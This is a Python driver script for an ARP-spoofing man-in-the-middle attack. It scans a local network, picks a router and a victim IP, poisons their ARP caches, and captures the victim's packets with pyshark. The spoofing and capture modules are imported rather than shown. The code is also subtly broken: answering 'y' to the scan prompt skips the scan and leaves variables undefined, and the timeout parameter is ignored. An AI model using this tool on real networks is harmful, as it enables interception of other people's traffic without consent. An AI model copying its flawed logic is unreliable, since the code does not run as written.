from main.spoof.nmap_wrapper import NmapWrapper
from main.spoof.arp_spoof import ArpSpoof
from main.spoof.pyshark_wrapper import PysharkWrapper


class SpoofDriver:
    def __init__(self):
        self.nmap = NmapWrapper()
        self.arp = None
        self.ps = None

    def scan_network(self):
        self.nmap.scan_network()
        return self.nmap.router_ip, self.nmap.target_ip

    def arp_spoof(self, router, target):
        self.arp = ArpSpoof(router, target)
        self.arp.start_spoof()

    def kill_arp_spoof(self):
        self.arp.stop_spoof()

    def capture_packets(self, location, target, timeout=60):
        self.ps = PysharkWrapper(location, target)
        self.ps.capture(timeout=120)


if __name__ == '__main__':
    answer = input('Do you want to scan the network for ip address')
    if answer == 'y':
        router = input('Enter router ip\n')
        target = [input('Enter target ip\n')]
    else:
        spoof = SpoofDriver()
        router, targets = spoof.scan_network()

        if router is None:
            print('[+] Error: Router not found')

        if len(targets) == 0:
            print('[+] Error: No targets were found')

        while True:
            target = input('Select a target\n')
            if target not in targets:
                print('[+] Please select a valid target from the list')
            else:
                break

    spoof.arp_spoof(router, target)

    while True:
        location = input('Enter your location\n')
        confirmation = input('Do you confirm your location as: {}?'.format(location))
        if confirmation.lower() == 'y':
            break
    spoof.capture_packets(location, targets)
    spoof.kill_arp_spoof()
